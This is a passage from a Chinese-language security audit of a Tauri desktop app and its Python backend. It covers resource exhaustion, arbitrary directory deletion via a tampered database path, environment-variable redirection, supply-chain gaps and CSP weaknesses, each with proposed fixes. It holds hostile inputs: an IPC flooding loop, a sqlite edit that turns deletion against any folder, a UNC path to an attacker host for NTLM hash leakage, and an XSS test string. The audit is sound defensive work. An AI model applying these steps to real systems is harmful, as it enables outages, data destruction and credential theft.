// src-tauri/src/main.rs:86-96
for line in reader.lines() {
    match line {
        Ok(l) => {
            ...
            if handle.emit("backend-message", l).is_err() { break; }   // 无节流
```

**攻击场景**（威胁 b/d，或任何能写 sidecar stdin 的组件）

前置条件：能向后端 stdin 写入（webview 代码执行即可，见 RT-03）。

1. 攻击者脚本在一个 tight loop 里调用 `backend_send`，每条都是合法的 8 MB 帧（例如 `settings.set` 带一个 ~8 MB 的 value，或 `dataset.frame` 之类）。
2. Rust 侧 `write_all` 到管道；Python 侧 `for raw in sys.stdin` 逐行读，每行都通过 8 MB 检查，然后 `submit` 进无界队列。
3. 队列以"写入速度 − 消费速度"的速率增长 → 数十秒内即达数 GB → 后端 OOM/被系统终止。
4. 更省力的变体：不发大帧，只发大量**小帧**。每条任务对象 + 解析后的 dict 也有固定开销，同样能撑爆内存，且不需要构造 8 MB 数据。
5. 输出侧：`job.progress` 有 `job_service.py:69-75` 的 200 ms/1% 节流（**已缓解**），但 `server.py:_write` 的响应帧与异常帧无节流。

**影响**：后端进程 OOM 或不可响应；用户在 UI 上看到"后端已退出"。无提权、无数据泄露 → Medium。

**已有缓解**：8 MB 行长度限制（有效，但只约束单帧）；`job.progress` 的事件节流（`job_service.py:69-75`，有效）；`_write_lock` 保证 stdout 写入不交错（正确）。

**修复建议**

1. 给 RPC 池加有界队列与拒绝策略。在 `server.py:25` 处替换默认 executor：

```python
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import threading

class _BoundedPool:
    def __init__(self, workers: int, queue_size: int):
        self._q: Queue = Queue(maxsize=queue_size)
        self._workers = workers
        self._threads = []
        self._closed = threading.Event()
        for i in range(workers):
            t = threading.Thread(target=self._loop, name=f"rpc-{i}", daemon=True); t.start()
            self._threads.append(t)
    def _loop(self):
        while not self._closed.is_set():
            item = self._q.get()
            if item is None: break
            fn, args = item
            try: fn(*args)
            except Exception: pass
            finally: self._q.task_done()
    def submit(self, fn, *args) -> bool:
        try:
            self._q.put_nowait((fn, args)); return True
        except queue.Full:
            return False
```

   并在 `serve_forever` 中：

```python
if not self._pool.submit(self._handle, line):
    self._write(frames.response_err(None, AppError("BUSY", "request queue is full")))   # 显式背压
```

   `queue_size` 建议 64–256（配合 8 MB 上限，最坏驻留 2 GB，仍需调小 `MAX_LINE_BYTES`）。

2. **把 `MAX_LINE_BYTES` 从 8 MB 调小**。当前没有任何方法需要 8 MB 的参数（`dataset.frame`、`analysis.chunk` 都只传 id/索引/上限值）。建议降到 **1 MB**，并对 `settings.set` 的 value 单独限制（如 4 KB）。
3. 在 Rust 侧（`main.rs:22`）也加长度硬上限（8 MB 或更低），在写管道之前就拒绝，避免无谓的管道写入。
4. 输出侧加节流/丢弃策略：`server.py:_write` 在写失败（管道满）时应有明确处理而不是阻塞；`main.rs:94` 的 `emit` 在监听器不可用时 `break`（已有）之外，可考虑合并/丢弃中间帧。

**验证方式**

- 静态：`sed -n '20,50p' backend/.../protocol/server.py`；`grep -n "MAX_LINE_BYTES" backend/.../protocol/frames.py`。
- 动态（dev，临时 `MDS_DATA_DIR`）：在浏览器控制台循环 `for (let i=0;i<200000;i++) window.__TAURI_INTERNALS__.invoke("backend_send",{line:JSON.stringify({protocol_version:1,id:i+1,method:"system.info",params:{}})})`（**只用只读的 `system.info`**），同时观察后端进程的内存曲线（任务管理器 / `psutil`）。若内存单调增长且无上界，问题成立。注意不要在生产机上跑满。

---

### RT-10 — `result.remove` / `analysis.delete` 对 DB 中的 `result_path` 无条件 `rmtree` → 任意目录删除

- **严重度**：Medium
- **CWE**：CWE-22、CWE-59（符号链接跟随导致的文件删除）
- **类别**：任意文件/目录删除
- **置信度**：高（代码路径确证）；可达性依赖对 `database.sqlite` 的写权限

**证据**

```python
# services/result_service.py:79-113
def remove(self, params: dict) -> dict:
    run_id = params.get("run_id")
    row = self.db.query_one("SELECT * FROM descriptor_runs WHERE id = ?", (run_id,))
    ...
    analyses = self.db.query("SELECT id, result_path FROM analysis_runs WHERE descriptor_run_id = ?", (run_id,))
    ...
    self._rmtree_quiet(row["result_path"])        # <-- 105：DB 里的字符串直接当路径
    for ana in analyses:
        self._rmtree_quiet(ana["result_path"])    # <-- 107
    return {"ok": True}

@staticmethod
def _rmtree_quiet(path: str | None) -> None:
    if path:
        shutil.rmtree(path, ignore_errors=True)   # <-- 113
```

```python
# services/analysis_service.py:373-381
def delete(self, params: dict) -> dict:
    ...
    self.db.execute("DELETE FROM analysis_runs WHERE id = ?", (analysis_id,))
    self._rmtree_quiet(row.get("result_path"))    # <-- 380
```

```python
# services/analysis_service.py:1570-1575
@staticmethod
def _rmtree_quiet(path: str | None) -> None:
    import shutil
    if path:
        shutil.rmtree(path, ignore_errors=True)
```

`result_path` 是 `descriptor_runs.result_path` / `analysis_runs.result_path` 列（`storage/database.py:64, 73`）。应用自身只在 `descriptor_service.py:373`、`analysis_service.py:1271-1274` 写入它，值是 `data_dir/results/...` 或 `data_dir/analysis/...`。但**读取时没有任何校验**。

**攻击场景**（威胁 c：同机其他用户 / 同用户恶意软件，配合 RT-11）

前置条件：攻击者能写 `database.sqlite`。两条现实路径：

1. **`MDS_DATA_DIR` 指向共享位置**（见 RT-11）。用户为存放大结果集把 `MDS_DATA_DIR` 设为 `D:\mds-data`、`\\nas\share\mds` 或一个所有人可写的目录。攻击者（同机其他用户）直接编辑 `database.sqlite`（SQLite 文件，无加密、无完整性保护），把某条 `descriptor_runs.result_path` 改成 `C:\Users\victim\Documents\实验数据`。
2. **同一用户的恶意软件**直接改库。

步骤：
1. 攻击者用 sqlite3 把目标行的 `result_path` 改成待删除目录，并把 `status` 设成 `COMPLETED`（绕过 `result_service.py:85` 的 QUEUED/RUNNING 检查）。
2. 受害者在 UI 上点"删除这条结果"（或攻击者通过 webview 脚本调用 `result.remove`）。
3. `_rmtree_quiet` → `shutil.rmtree("C:\\Users\\victim\\Documents\\实验数据", ignore_errors=True)` → **整个目录被递归删除**，`ignore_errors=True` 使得部分失败也会被静默忽略，日志中也不会留下痕迹。

**影响**：受害者可写/可删除范围内任意目录的**递归删除**——数据破坏，且因 `ignore_errors=True` 难以追责和恢复。

**已有缓解**：`shutil.rmtree` **不会跟随目录符号链接**（Python 3.8+ 对目录链接报 `OSError` 而非递归进入），因此"放一个指向他处的目录链接"这条路被部分阻断；但**文件符号链接会被直接删除**（不跟随，删的是链接本身）。`result_service.py:85` 的状态检查只防误删运行中的任务，不是安全控制。

**修复建议**（`result_service.py:110` 与 `analysis_service.py:1570` 两处都要改）

```python
def _rmtree_quiet(path: str | None, data_dir: Path) -> None:
    if not path:
        return
    p = Path(path)
    # 1) 拒绝 UNC / 相对路径 / ADS
    raw = str(path)
    if raw.startswith("\\\\") or raw.startswith("\\\\?\\") or "::$" in raw.upper():
        log.error("refusing to delete non-local result path: %r", path); return
    if not p.is_absolute():
        log.error("refusing to delete relative result path: %r", path); return
    # 2) 规范化后必须仍在 data_dir 之内（逐 case 归一化以适配 Windows）
    try:
        resolved = p.resolve(strict=False)
        base = data_dir.resolve()
    except OSError:
        return
    if ".." in resolved.parts or not str(resolved).lower().startswith(str(base).lower() + os.sep):
        log.error("refusing to delete result path outside the data dir: %r", path); return
    # 3) 拒绝符号链接（防删到链接目标 / 防链接被替换）
    if resolved.is_symlink():
        log.error("refusing to delete symlinked result path: %r", path); return
    # 4) 只删文件，遇到子目录需要再确认；用 onerror 记录而不是静默
    def _onerror(func, target, exc):
        log.error("rmtree failed on %s: %s", target, exc)
    shutil.rmtree(resolved, onerror=_onerror)
```

配套：
- `ResultService.__init__` / `AnalysisService.__init__` 需要拿到 `data_dir`（`AnalysisService` 已有 `self.data_dir`，`ResultService` 目前只有 `db`，需在 `main.py:171` 构造时一并传入）。
- `analysis_service.py:380` 与 `result_service.py:105,107` 的调用点同步改为传入 `self.data_dir`。
- 更根本的：不要信任 DB 里的路径。删除时改为**从 `run_id` 重新推导**受信任的路径（`data_dir / "results" / f"run_{id.removeprefix('run_')}"`、`data_dir / "analysis" / analysis_id`），完全不读 DB 中的 `result_path`。这是最干净的方案。
- 数据库完整性：若将来支持共享数据目录，应给 `database.sqlite` 加完整性保护（例如把关键表连同 HMAC 一起存，或用 SQLCipher），使"改库"不再是一个无痕的原语。

**验证方式**

- 静态：`grep -rn "rmtree" backend/.../services/`。
- 动态（临时 `MDS_DATA_DIR` 下的副本数据库）：
  1. 正常跑出一个 COMPLETED run，得到其 `run_id` 与 `result_path`。
  2. 用 `sqlite3 <data_dir>/database.sqlite "UPDATE descriptor_runs SET result_path='<临时目录>/canary' WHERE id='<run_id>'"`，在 `<临时目录>/canary` 放几个文件。
  3. 通过 IPC 调用 `result.remove {"run_id":"<run_id>"}` → 观察 `<临时目录>/canary` 是否被整目录删除。若被删除，问题成立。
  - **全过程只在临时目录内操作**，不要用任何真实数据目录。

---

### RT-11 — `MDS_DATA_DIR` 完全受控且无校验 → 数据目录重定向

- **严重度**：Low（放大 RT-01 与 RT-10）
- **CWE**：CWE-15（外部控制的系统设置）、CWE-426
- **类别**：不安全的配置
- **置信度**：高

**证据**

```python
# backend/mdescriptor_studio_backend/config.py:12-21
def data_dir() -> Path:
    override = os.environ.get("MDS_DATA_DIR")
    if override:
        root = Path(override)                 # <-- 15：无任何校验
    else:
        local = os.environ.get("LOCALAPPDATA")
        root = (Path(local) if local else Path.home()) / APP_DIR_NAME
    for sub in ("logs", "results", "analysis", "cache"):
        (root / sub).mkdir(parents=True, exist_ok=True)    # <-- 20：在任意位置递归建目录
    return root
```

```rust
// src-tauri/src/main.rs:117-121
if let Ok(data_dir) = std::env::var("MDS_DATA_DIR") {
    if !data_dir.is_empty() {
        c.env("MDS_DATA_DIR", data_dir);      // <-- 119：只检查非空
    }
}
```

```python
# storage/database.py:107-108
def __init__(self, path: Path):
    path.parent.mkdir(parents=True, exist_ok=True)      # <-- 108
    self._conn = sqlite3.connect(str(path), check_same_thread=False)
```

```python
# analysis/engine.py:613
root = os.environ.get("MDS_DATA_DIR") or tempfile.gettempdir()   # numba 缓存根
```

**攻击场景**（威胁 c）

前置条件：能设置应用进程的环境变量。非管理员即可做到：修改快捷方式的"起始位置/目标"、用 `setx MDS_DATA_DIR ...`、通过 `App Paths` 注册表项、由父进程/启动器注入、或用 `Process Startup` 的 `lpEnvironment`。

1. **放大 RT-10**：把 `MDS_DATA_DIR` 指向一个共享目录（用户为了存大结果常这么做，例如 `D:\mds` 或 `\\nas\shared\mds`），`database.sqlite` 就落在攻击者可写处 → 改写 `result_path` → `rmtree` 任意目录。
2. **放大 RT-01**：`MDS_DATA_DIR` 同时是 numba 缓存根（`engine.py:613`），攻击者若对该目录有写权限即可投毒 `.nbi` → pickle RCE。
3. **UNC 凭据外泄**：`MDS_DATA_DIR=\\attacker.tld\share\mds` → 启动时 `mkdir` + 打开 SQLite + 建日志 → 多次 SMB 认证 → NTLM 哈希外泄/中继。
4. **目录创建/磁盘占用**：`config.py:20` 会在任意指定路径递归创建 4 个子目录；`RotatingFileHandler`（`logging_setup.py:22`）会在此写最多 4×5 MB 日志。

**影响**：本身危害有限（攻击者仍需其他原语），但它把 RT-01 与 RT-10 的可达性从"需写受害者 profile 目录"扩展到"需写任意一个用户指定的共享位置"，是明确的放大器。

**已有缓解**：Rust 侧的 `!data_dir.is_empty()` 检查（`main.rs:118`）；默认路径 `%LOCALAPPDATA%\MDescriptorStudio` 是安全的。

**修复建议**

1. `config.py:12-21` 增加校验：

```python
def _resolve_override(override: str) -> Path | None:
    if override.startswith("\\\\") or override.startswith("//") or override.startswith("\\\\?\\"):
        log.warning("MDS_DATA_DIR is a UNC path; ignoring override")
        return None
    p = Path(override)
    if not p.is_absolute() or ".." in p.parts or ":" in override[2:] or "::$" in override.upper():
        log.warning("illegal MDS_DATA_DIR %r; ignoring override", override)
        return None
    return p
```

2. **Release 构建中应忽略 `MDS_DATA_DIR`**（它只应作为测试/开发用途）：`main.rs:117` 改为仅 `cfg!(debug_assertions)` 时才透传；release 始终使用 `%LOCALAPPDATA%\MDescriptorStudio`。若产品要保留"自定义数据目录"功能，改为**在应用设置里由用户通过原生目录对话框选择，并持久化到受保护的配置**而不是读环境变量。
3. `engine.py:613` 的 numba 缓存根不要复用 `MDS_DATA_DIR`（见 RT-01 修复），应固定在 `%LOCALAPPDATA%\MDescriptorStudio\numba-cache`。
4. `config.py:20` 建目录后收紧 ACL（仅当前用户），并在目录 ACL 不合规时告警。

**验证方式**

- 静态：`sed -n '1,25p' backend/.../config.py`；`sed -n '106,126p' src-tauri/src/main.rs`。
- 动态：用 `setx MDS_DATA_DIR D:\tmp\mds-test` 后启动应用（dev 即可），确认 `D:\tmp\mds-test\{logs,results,analysis,cache}` 与 `database.sqlite` 被创建 → 证明环境变量完全受控。再试 `MDS_DATA_DIR=relative/path` 与 UNC 值观察是否也被接受。

---

### RT-12 — 供应链：依赖无哈希锁定、npm 全 `^` 范围、165 MB 预构建二进制入库无校验和

- **严重度**：Low（构建期；一旦镜像源/仓库被劫持则为 High）
- **CWE**：CWE-494、CWE-1357（依赖不受控的可传递依赖）
- **类别**：供应链
- **置信度**：高

**证据**

```
# backend/requirements.txt:1-10
mdescriptor==0.2.7
numpy==2.5.2
scipy==1.18.1
scikit-learn==1.9.0
umap-learn==0.5.12
hdbscan==0.8.44
dpdata==1.1.0
```
版本用 `==` 固定（好），但**没有 `--hash=sha256:...`**，也没有 `--require-hashes`；`update_service.py:101` 的 pip 调用同样如此（见 RT-05）。

```json
// frontend/package.json:13-27，全部为 caret 范围
"@ant-design/icons": "^6.0.0",
"@fluentui/react-icons": "^2.0.270",
"@tauri-apps/api": "^2.11.1",
"@tauri-apps/plugin-dialog": "^2.7.2",
"3dmol": "^2.5.5",
"antd": "^5.27.0",
"echarts": "^6.0.0",
"echarts-for-react": "^3.0.2",
"plotly.js": "^2.35.2",
"react-plotly.js": "^2.6.0",
"react": "^18.3.1",
"react-dom": "^18.3.1",
"zustand": "^5.0.8"
```

`frontend/src` 里运行的第三方代码量很大（antd、echarts、plotly、3dmol 都会解析数据并操作 DOM），而 RT-03 表明这些代码一旦被投毒即拥有**后端全部能力**。

```powershell
# scripts/package.ps1:11-14
& "$root\.venv\Scripts\python.exe" -m PyInstaller backend.spec --noconfirm --log-level ERROR
Copy-Item "$root\backend\dist\backend.exe" "$root\src-tauri\binaries\backend-x86_64-pc-windows-msvc.exe" -Force
```

`src-tauri/binaries/backend-x86_64-pc-windows-msvc.exe`（165 MB）直接提交进 Git，`scripts/package.ps1` 覆盖写入，**无哈希记录、无签名步骤**（也见 RT-04）。

**攻击场景**（威胁 b）

1. npm 镜像源被劫持 / 某个传递依赖被投毒 → `npm install` 拉到恶意包 → 构建产物进入 Tauri bundle → 运行时该包在 webview 里执行 → 通过 `backend_send`（RT-03）获得任意文件写（RT-02）、numba 缓存路径控制（RT-01）、pip 触发（RT-05，dev）等能力。
2. PyPI 镜像被劫持 → `pip install -r requirements.txt` 装到恶意包（无 `--require-hashes` 所以无法发现）→ 打进 sidecar → 每次启动执行。
3. `src-tauri/binaries/backend-*.exe` 是一个没有校验和的 165 MB 二进制；任何能改这个仓库文件的人（被盗的开发者账号、被污染的构建机）都能植入后门，而 CI（`scripts/package.ps1`）不会察觉。

**影响**：构建期供应链投毒 → 运行时完整代码执行。定 Low 是因为它需要上游被攻陷（非本代码库缺陷），但一旦发生影响是 Critical。

**已有缓解**：`package-lock.json` 与 `frontend/package-lock.json` 存在（但依赖声明用 `^`，`npm install` 仍可跨 minor/major 漂移；只有 `npm ci` 才严格按 lockfile）；`requirements.txt` 用 `==` 固定；`Cargo.lock` 存在；`backend.spec:50` 排除了 `tkinter/matplotlib/pytest/PyInstaller`（缩小攻击面，好）。

**修复建议**

1. Python 侧：`pip-compile --generate-hashes` 生成带哈希的 `requirements.txt`，安装时强制 `pip install --require-hashes -r requirements.txt`。在 `scripts/package.ps1:12` 之前加这一步。
2. npm 侧：CI 与发布一律用 `npm ci`（不要用 `npm install`）；把 `frontend/package.json` 的关键依赖改为精确版本（至少 `@tauri-apps/api`、`@tauri-apps/plugin-dialog`、`3dmol`、`plotly.js`）；启用 `npm audit --audit-level=high` 作为构建门禁；考虑 `pnpm`/`yarn` 的 lockfile 完整性校验。
3. Sidecar 二进制：移出 Git（用 Git LFS 或构建产物仓库）；`scripts/package.ps1:14` 之后生成 `backend-<triple>.exe.sha256` 并纳入发布签名；`main.rs` 在 spawn 前校验（见 RT-04）。
4. CI 加固：给构建机加依赖来源白名单（只走官方 registry 或内部可信代理），并对最终 installer 做 Authenticode 签名。

**验证方式**

- `grep -c "hash" backend/requirements.txt`（应为 0）；`grep -n '"\^' frontend/package.json | wc -l`；`ls -la src-tauri/binaries/`（应无 `.sha256`）。
- `cd frontend && npm ls --depth=0` 与 `npm audit` 看当前依赖树状态（只读，不要安装）。

---

### RT-13 — CSP 缺少 `script-src`/`object-src`/`base-uri`/`frame-ancestors`，保留 `style-src 'unsafe-inline'`

- **严重度**：Low
- **CWE**：CWE-1021、CWE-693（保护机制失效）
- **类别**：Tauri 配置硬化
- **置信度**：高

**证据**

```json
// src-tauri/tauri.conf.json:24-26
"security": {
  "csp": "default-src 'self'; connect-src 'self' ipc: http://ipc.localhost; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:"
}
```

已核查的前端渲染路径（**当前未发现 XSS sink**）：

- `grep -rn "dangerouslySetInnerHTML|new Function|eval\(" frontend/src` → 无匹配；
- `innerHTML` 仅用于**清空**容器：`frontend/src/pages/Explore.tsx:218`、`frontend/src/components/StructurePreview.tsx:168`（均为 `viewerDiv.current.innerHTML = ""`）；
- 3D 结构渲染走 3dmol 的程序化 API：`StructurePreview.tsx:177-178` `viewer.addModel()` / `model.addAtoms(atoms)`，`atoms` 由 `parseViewerAtoms(frame)` 从数值字段构造；**不解析不可信 HTML/XYZ 字符串**；
- 图表走 echarts / plotly 的 JS 对象配置，未发现 `innerHTML`/`srcdoc` 注入。

**缺口分析**

1. 未显式声明 `script-src` → 回退到 `default-src 'self'`，实际效果尚可；但显式声明更稳健（`'self'` 会随 Tauri 版本对 `tauri.localhost` / `asset://` 的解析方式变化而变化）。
2. **无 `object-src`** → 回退到 `'self'`；在 WebView2 上风险有限，但显式 `'none'` 更好。
3. **无 `base-uri`** → 允许 `<base>` 注入改变相对 URL 解析（需先有 HTML 注入，当前无）。
4. **无 `frame-ancestors` / `frame-src`** → 回退到 `'self'`，未显式收紧。
5. `style-src 'unsafe-inline'` → 允许内联样式。若将来出现 HTML 注入，可用 CSS 做侧信道外泄。
6. `img-src data: blob:` 与 `font-src data:` 是 3dmol/图表渲染所需，可接受。

**攻击场景**：当前**不可直接利用**（无 HTML 注入点）。价值在于纵深防御：一旦某个第三方组件（antd/echarts/plotly/3dmol）出现 DOM XSS，或将来有人引入 markdown/HTML 渲染，缺少这些指令会显著降低利用门槛。

**影响**：纵深防御缺口。当前无实际利用路径 → Low。

**已有缓解**：`default-src 'self'` 的回退覆盖了主要风险；`connect-src` 显式限制为 `ipc:` 与 `http://ipc.localhost`（正确）；未启用 `dangerouslyDisableAssetCspModification` 之类的削弱选项；未启用 shell 插件（正确）。

**修复建议**（`src-tauri/tauri.conf.json:25`）

```json
"csp": "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; frame-src 'none'; connect-src 'self' ipc: http://ipc.localhost; img-src 'self' data: blob:; style-src 'self' 'unsafe-inline'; font-src 'self' data:"
```

说明：
- `style-src 'unsafe-inline'` 是 antd 运行时注入样式所必需；若要收紧，需评估 antd 的 CSS-in-JS 方案（可用 nonce + `style-src 'self' 'nonce-<随机>'`，需 Tauri 侧注入 nonce）；
- 收紧 `script-src` 后若出现第三方组件使用 `eval`（例如某些 mustache/handlebars 预编译模板），需在评估后决定是否加 `'unsafe-eval'`——**不要**无脑加；
- 一并确认 release 构建中 CSP 确实以响应头/`<meta>` 形式生效（可用 DevTools 网络面板或 `document.querySelector('meta[http-equiv]')` 查看）。

**验证方式**

- `grep -n "csp" src-tauri/tauri.conf.json`。
- 在 dev 构建中打开 DevTools Console，执行 `document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content`（或查看文档响应头），确认 CSP 已注入；再尝试 `document.body.innerHTML += '<img src=x onerror=alert(1)>'` 与 `eval('1+1')`，确认被 CSP 拦截（这能验证 CSP 真实生效，而不仅是配置字符串存在）。

---

## 5. 附加发现

| ID | 标题 | 严重度 | 证据 | 说明 |
|---|---|---|---|---|
| A1 | `np.load` 未显式传 `allow_pickle=False` | Low（已缓解但脆弱） | `services/result_service.py:77` `np.load(path / "values.npy")`、`:142` `np.load(offsets_file)` | numpy ≥1.16.3 默认 `allow_pickle=False`，所以**当前安全**。但同一代码库其他地方都显式传了（`analysis_service.py:239,272,426,972,1525`）。若将来为兼容旧 `.npy` 打开 pickle，或 numpy 默认值变更，这两处即退化为 pickle RCE。建议显式化并在 code review 中列为硬性要求。 |
| A2 | `job.cancel` 无归属/权限校验 | Low | `main.py:104` `"job.cancel": lambda params: jobs.cancel(params.get("id"))` | 任何 webview 脚本可取消任意 job（id 形如 `job_<12位hex>`，可枚举/从 `job.list` 获取）。影响：可用性干扰 + 若取消正在落盘的 job，可能留下不一致状态（`_settle_linked_runs` 只改 DB，不清理磁盘）。建议把 job 与发起窗口/会话绑定。 |
| A3 | `settings.set` 无 key 白名单与长度限制 | Low | `main.py:74-79`（`str(value)` 直接入库）；`database.py:154-159` | 任意 key/value 写入 `settings` 表，无长度上限 → 可撑大 SQLite 文件。当前前端只用 `ui.language` 等少数 key（`i18n/index.ts`、`workspace.ts:70`）。建议加 key 白名单与 value 长度上限（如 4 KB），并同步收紧 RT-09 中 `MAX_LINE_BYTES`。 |
| A4 | 错误信息与日志泄露绝对路径与内部异常 | Low | `protocol/server.py:75`（`f"{type(exc).__name__}: {exc}"` 直发前端）；`logging_setup.py:17`（`backend.log` 含 data_dir 绝对路径）；`dataset_service.py:134`、`datasets/base.py:67,71`、`datasets/deepmd.py:35,46,85` | 向 webview 回传异常类型与消息，含绝对路径与第三方库内部细节，便于攻击者构造 oracle（见 RT-06）。建议前端只收 `code` + 稳定文案 + `error_id`，细节只进日志；日志中对路径做脱敏。 |
| A5 | 产物写入使用 staging + `os.replace`（**已缓解**） | 信息 | `analysis_service.py:1273-1312` | `staging.mkdir(parents=True, exist_ok=False)` + `os.replace(staging, final)` + 异常时 `_rmtree_quiet(staging)`，是正确的原子写入模式，**无需修改**。仅注意 `_commit_artifact` 的 `manifest["files"]` 只使用 `target.name`（第 1293 行），因此 `chunk`（第 422 行）拼接出的路径不存在遍历问题——但 `_artifact_is_complete`（第 1472 行）读的是**磁盘上**的 `manifest.json` 而非 DB 列，若产物目录可被攻击者写（共享 `MDS_DATA_DIR`），`file_meta["path"]` 可以是 `../../..`。建议第 1472 行也限制为 `Path(name).name`。 |
| A6 | SQL 注入 | **未发现** | `storage/database.py:132-148`（全部参数化）；`result_service.py:17-29`、`analysis_service.py:348-365`、`job_service.py:224-236` | 所有用户可控值都走 `?` 占位符；动态拼接的只有**硬编码列名**（`r.dataset_id = ?`、`r.descriptor_name = ?`、`analysis_type = ?`、`status = ?`），列名来自固定的 if 分支，非用户输入。`_migrate` 用 `executescript` 但脚本是模块内常量。 |
| A7 | 硬编码凭据 / 密钥 | **未发现** | 全仓 `grep -niE "api[_-]?key|secret|password|token|bearer|aws_|private_key"`（限 `backend/`、`src-tauri/src`、`frontend/src`） | 仅匹配到不相关的标识符（`tokens`、`tokenSeparators`、`theme.token`、`protocol`）。**无**硬编码密钥、令牌或凭据。 |
| A8 | 第三方模型反序列化器（mdescriptor 自研） | 信息（建议 fuzz） | `.venv/Lib/site-packages/mdescriptor/descriptors/model_backed/_vendor/dpa4desc/weights.py:100-135` | mdescriptor 为了不依赖 torch，自研了 `TorchCheckpointUnpickler`，`find_class` 只放行 `collections.OrderedDict` 与 `torch._utils._rebuild_tensor*`，其余抛 `UnpicklingError`；`persistent_load` 用 `ZipFile.read()`（字典查找，无路径遍历）。**这是做得好的缓解**。但它是手写的 pickle 解析器，属于高风险面：建议蓝队对用户可指定的 `model` 参数路径（`SchemaForm.tsx:198-211` 允许用户浏览任意模型文件 → `descriptor.submit.parameters`）做畸形 checkpoint 的 fuzz。`weights.py` 属第三方库，本次未做完整审查。 |

---

## 6. 未覆盖说明

以下内容本次**没有看透**，建议蓝队补位：

1. **`.venv` 内的第三方库**（`numpy/scipy/sklearn/umap/hdbscan/dpdata/mdescriptor/numba`）。本次仅为了确认 RT-01 与 A8 而做了定向只读核查（numba `caching.py`、umap `layouts.py`、mdescriptor `weights.py`）。未审查：
   - **dpdata 1.1.0 的 `deepmd/npy` 加载路径**是否在任何地方使用 `np.load(..., allow_pickle=True)` 或 `pickle`。这是威胁模型 (a) 的核心入口（`datasets/deepmd.py:39-41` 直接把用户目录交给 dpdata），**优先级最高**。
   - `hdbscan`/`sklearn` 内部是否有可被恶意数值触发的不安全内存操作。
   - PyInstaller 打包时被 `collect_all` 拉入的 `datas` 是否包含可被覆盖的脚本/配置文件。
2. **mdescriptor 引擎本体**（`_native.cp312-win_amd64.pyd`，编译产物）。`descriptor_service` 把用户可控的 `numbers/positions/cells/pbc/offsets` 直接交给它（`mdescriptor_adapter.py:100-108`）。原生扩展中的越界读写无法静态评估，建议对 `StructureBatch` 构造做 fuzz（尤其是 `offsets` 与 `numbers` 不一致、`natoms` 极大、`cell` 奇异等情形）。
3. **Tauri 运行时本体**（tauri 2.11.5 / WebView2）。未审查 Tauri 框架自身的 IPC 反序列化、自定义协议处理、以及内置命令的 ACL 实现细节。特别是：**应用自定义命令（`backend_send` 等）在 Tauri 2 中是否需要显式 permission**——`src-tauri/gen/schemas/acl-manifests.json` 中未出现 `backend_send`，本报告按"无显式授权约束"处理；若蓝队确认 Tauri 对应用自定义命令有默认放行语义，RT-03 的"权限声明缺失"部分可微调措辞，但"无参数校验、无换行过滤、无事件来源绑定"的结论不受影响。
4. **编译产物**：`src-tauri/target/`、`frontend/dist/`、`backend/build/`、`backend/dist/` 未审查。这些目录里的产物不一定与源码一致（例如 `src-tauri/binaries/backend-x86_64-pc-windows-msvc.exe` 是 2026-08-30 构建的，可能与当前源码不同步），报告中 RT-01/RT-04/RT-05 的"release 行为"结论建立在"该二进制由当前 `backend.spec` + 当前源码构建"这一假设上，建议蓝队用 `scripts/package.ps1` 重新构建后复核。
5. **NSIS 安装器的最终 ACL 与提权行为**。本次只看到 `tauri.conf.json:35-37` 的 `installMode: perMachine`，未审查生成的 `.nsi` 模板（在 `src-tauri/target/release/bundle/nsis/` 或 Tauri 内置模板中）。安装目录是否对 `Users` 可写直接决定 RT-04 的可达性，**建议蓝队实测 `icacls`**。
6. **`frontend/node_modules`**。按范围排除。但 RT-12/RT-03 的风险实质来自这些代码，建议蓝队用 `npm audit` + SBOM 比对做一次依赖侧评审。
7. **运行时行为验证**。本次为**纯静态审计**，未启动应用、未 spawn 后端、未执行 pip/npm 安装。所有"攻击场景"均为代码路径推演；第 4 节每条给出的"验证方式"均未实际执行。RT-01 的 `pickle.load` 调用点在源码中已确证，其余动态行为（尤其是 RT-06 的"错误消息内容外泄"、RT-08 的实际内存表现）需要蓝队在隔离环境复现。
8. **`tests/` 的掩盖风险**。已抽查 `tests/test_adversarial_fixes.py`（118 行，覆盖 job id、adapter 缓存失效、删除级联、奇异晶胞、畸形 extxyz）与 `tests/test_engine_update.py`（59 行）。这些测试覆盖了**正确性与健壮性**，但**没有任何一条针对**本报告的路径遍历、反序列化、缓存投毒或队列上限。换言之，现有测试不会掩盖本报告的发现（它们测的是别的东西），但也意味着本报告的问题在 CI 中完全无防护。建议为 RT-01/RT-02/RT-07/RT-08 各补一条回归测试。

---

## 附：建议的修复优先级

| 优先级 | ID | 理由 |
|---|---|---|
| P0 | RT-01 | 唯一一条"无交互、纯本地、直接 RCE"；且是应用自身主动引入的暴露面 |
| P0 | RT-02 | 任意路径写是最容易被滥用的原语；修复成本低（一个校验函数） |
| P0 | RT-03 | 是所有前端侧威胁的放大器；改为 Rust 侧构造帧可一次性消除三类问题 |
| P1 | RT-07 | 直接威胁本产品的核心价值（科学结论的正确性），用户无感知 |
| P1 | RT-08 | 威胁模型 (a) 中最容易触发的一条（一个几十字节的文件） |
| P1 | RT-09 | 修复简单（有界队列 + 调低 `MAX_LINE_BYTES`） |
| P1 | RT-10 | 破坏性删除；改从 `run_id` 重新推导路径即可根治 |
| P2 | RT-04 | 需先实测安装目录 ACL，再决定投入 |
| P2 | RT-05 | release 已被 `_frozen()` 阻断；先修 dev 流程与版本校验 |
| P2 | RT-06 | 需与 RT-03 一并修（都依赖 webview 代码执行） |
| P3 | RT-11 / RT-12 / RT-13 | 加固与流程改进 |
